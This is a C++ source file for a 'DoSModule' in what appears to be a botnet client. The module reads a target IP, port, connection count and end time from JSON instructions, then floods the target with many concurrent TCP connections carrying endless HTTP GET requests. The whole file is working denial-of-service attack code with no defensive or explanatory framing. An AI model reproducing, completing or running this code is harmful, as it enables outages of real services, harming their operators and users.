#include "DoSModule.h"
#include "BotLogger.h"
#include <atomic>
#include <chrono>
#include <thread>
#include <sstream>
#include <iomanip>

DoSModule::DoSModule()
    : m_target_ip(""), m_target_port(0), m_stop_attack(false) {}

DoSModule::~DoSModule() {
  try {
    BotLogger::getInstance().save_log("Stopping DoS attack...", LogLevel::INFO,
                                      BotModules::DOS);
    shutdown_module();
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::DOS);
  }
}

std::string DoSModule::get_module_name() const {
  return "dos";
}

void DoSModule::connect_to_target() {
  auto socket = std::make_shared<boost::asio::ip::tcp::socket>(*m_io_context);

  {
    std::lock_guard<std::mutex> lock(m_sockets_mutex);
    m_sockets.push_back(socket);
  }

  auto endpoints = m_resolver->resolve(m_target_ip, std::to_string(m_target_port));

  boost::asio::async_connect(*socket, endpoints,
    [this, socket](const boost::system::error_code &ec, boost::asio::ip::tcp::endpoint) {
      if (!ec) {
        send_data_async(socket);
      } else {
        BotLogger::getInstance().save_log("Failed to connect: " + ec.message(), LogLevel::ERROR, BotModules::DOS);

        auto retry_timer = std::make_shared<boost::asio::steady_timer>(*m_io_context);
        retry_timer->expires_after(std::chrono::milliseconds(200));
        retry_timer->async_wait([this](const boost::system::error_code &ec) {
          if (!ec && !m_stop_attack.load()) {
            connect_to_target();
          }
        });
      }
    }
  );
}

void DoSModule::execute_module(const nlohmann::json &instructions) {
  try {
    BotLogger::getInstance().save_log("Executing DoS module...", LogLevel::INFO, BotModules::DOS);

    m_target_ip = instructions["parameters"]["target_ip"];
    m_target_port = instructions["parameters"]["target_port"];
    int connection_count = instructions["parameters"]["connection_count"];
    int delay_ms = instructions["parameters"]["delay_ms"];

    std::string until_str = instructions["until"];
    std::tm end_time_tm = {};
    std::istringstream ss(until_str);
    ss >> std::get_time(&end_time_tm, "%Y-%m-%dT%H:%M:%S");
    auto end_time = std::chrono::system_clock::from_time_t(std::mktime(&end_time_tm));
    auto now = std::chrono::system_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(end_time - now);

    // Re-initialize IO context
    m_io_context = std::make_shared<boost::asio::io_context>();
    m_resolver = std::make_shared<boost::asio::ip::tcp::resolver>(*m_io_context);
    m_timer = std::make_shared<boost::asio::steady_timer>(*m_io_context);

    // Set up stop timer
    m_timer->expires_after(duration);
    m_timer->async_wait([this](const boost::system::error_code &ec) {
      if (!ec) {
        stop_attack();
      }
    });

    m_stop_attack.store(false);

    for (int i = 0; i < connection_count; ++i) {
      connect_to_target();
      std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
    }

    // Start async worker
    m_worker_thread = std::thread([this]() {
      try {
        m_io_context->run();
      } catch (const std::exception &e) {
        BotLogger::getInstance().save_exception(e, LogLevel::ERROR, BotModules::DOS);
      }
    });

  } catch (const std::exception &e) {
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR, BotModules::DOS);
  }
}

void DoSModule::send_data_async(std::shared_ptr<boost::asio::ip::tcp::socket> socket) {
  if (m_stop_attack.load() || !socket->is_open()) return;

  std::string data = "GET / HTTP/1.1\r\nHost: " + m_target_ip + "\r\n\r\n";

  boost::asio::async_write(*socket, boost::asio::buffer(data),
    [this, socket](const boost::system::error_code &ec, std::size_t) {
      if (!ec) {
        send_data_async(socket);
      } else {
        BotLogger::getInstance().save_log("Write error: " + ec.message(), LogLevel::WARNING, BotModules::DOS);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        send_data_async(socket);
      }
    }
  );
}

void DoSModule::stop_attack() {
  m_stop_attack.store(true);
  try {
    BotLogger::getInstance().save_log("Stopping DoS attack...", LogLevel::INFO, BotModules::DOS);
    shutdown_module();
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR, BotModules::DOS);
  }
}

void DoSModule::shutdown_module() {
  if (m_io_context) {
    m_io_context->stop();
  }

  {
    std::lock_guard<std::mutex> lock(m_sockets_mutex);
    for (auto &socket : m_sockets) {
      if (socket->is_open()) {
        boost::system::error_code ec;
        socket->close(ec);
      }
    }
    m_sockets.clear();
  }

  if (m_worker_thread.joinable()) {
    m_worker_thread.join();
  }
}
